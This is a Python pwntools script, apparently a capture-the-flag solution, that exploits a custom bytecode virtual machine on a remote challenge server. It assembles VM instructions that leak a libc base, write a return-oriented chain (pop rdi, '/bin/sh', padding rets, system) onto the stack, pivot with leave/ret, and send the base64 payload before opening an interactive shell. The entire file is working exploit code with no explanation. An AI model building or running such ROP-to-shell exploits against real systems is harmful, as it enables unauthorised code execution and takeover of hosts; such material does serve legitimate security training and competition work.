from pwn import *
from base64 import b64encode

def load_libc_base_reg4():
    return [
        b"\x10\x06\xe2",        
        b"\x10\x05\xe1",        
        b"\x10\x04\xe0",
        b"\x13\x04\x00\x08",
        b"\x13\x04\x00\x08",
        b"\x11\x05\xff\xf8"
    ]

def clear_regs_0_3():
    return [
        b"\x13\x00\x00\x08",
        b"\x13\x00\x00\x08",
        b"\x13\x01\x00\x08",
        b"\x13\x01\x00\x08",
        b"\x13\x02\x00\x08",
        b"\x13\x02\x00\x08",
        b"\x13\x03\x00\x08",
        b"\x13\x03\x00\x08",
    ]

def store_with_correct_endian(reg, addr):
    addr2 = addr + 1
    addr = str(hex(addr)[2:]).rjust(4, "0")
    start1 = addr[:2]
    end1 = addr[2:]
    addr2 = str(hex(addr2)[2:]).rjust(4, "0")
    start2 = addr2[:2]
    end2 = addr2[2:]
    instr = [
        b"\x04" + bytes.fromhex(hex(reg)[2:].rjust(2,"0")) + bytes.fromhex(start1) + bytes.fromhex(end1),
        b"\x13" + bytes.fromhex(hex(reg)[2:].rjust(2,"0")) + b"\x00\x08",
        b"\x04" + bytes.fromhex(hex(reg)[2:].rjust(2,"0")) + bytes.fromhex(start2) + bytes.fromhex(end2),
    ]
    return instr
    
instructions = [b"\xcc" for _ in range(500)] # make space for ropchain

instructions.extend(load_libc_base_reg4())

pop_rdi = 0x10f75b
binsh = 0x1cb42f
system = 0x58740
ret = 0x2882f

ropchain = [pop_rdi, binsh]
ropchain.extend([ret for _ in range(241)]) # create stack space for system
ropchain.append(system)

for i, gadget in enumerate(ropchain):
    instructions.extend(clear_regs_0_3())
    addr = str(hex(gadget)[2:])
    end = addr[-4:]
    mid = addr[:-4].rjust(4, "0")
    instr = [
        b"\x01\x00\x04",
        b"\x01\x01\x05",
        b"\x01\x02\x06",
        b"\x11\x00" + bytes.fromhex(end[:2]) + bytes.fromhex(end[2:]),
        b"\x11\x01" + bytes.fromhex(mid[:2]) + bytes.fromhex(mid[2:]),
    ]
    instr.extend(store_with_correct_endian(0, (i*8)+8))
    instr.extend(store_with_correct_endian(1, (i*8+2)+8))
    instr.extend(store_with_correct_endian(2, (i*8+4)+8))
    instructions.extend(instr)

leave_ret = [
    b"\x01\x00\x04",
    b"\x01\x01\x05",
    b"\x01\x02\x06",
    b"\x11\x00\x99\xd2",
    b"\x11\x01\x00\x02",
]

instructions.extend(leave_ret)

pop_rbp = [
    b"\x13\x04\x00\x08",
    b"\x13\x04\x00\x08",
    b"\x10\x04\xf8",
    b"\x11\x04\x01\x74",
    b"\x06\xf8\x04"
]

instructions.extend(pop_rbp)

payload = b"".join([x.ljust(4, b"\x00") for x in instructions])

# with open("shellcode.bin", "wb") as f:
#     f.write(payload)
# print(len(b64encode(payload)))

io = remote('wackattack-eef0-eptvm.ept.gg', 1337, ssl=True)
# io = remote("localhost", 1024)
io.sendline(b64encode(payload))
io.interactive()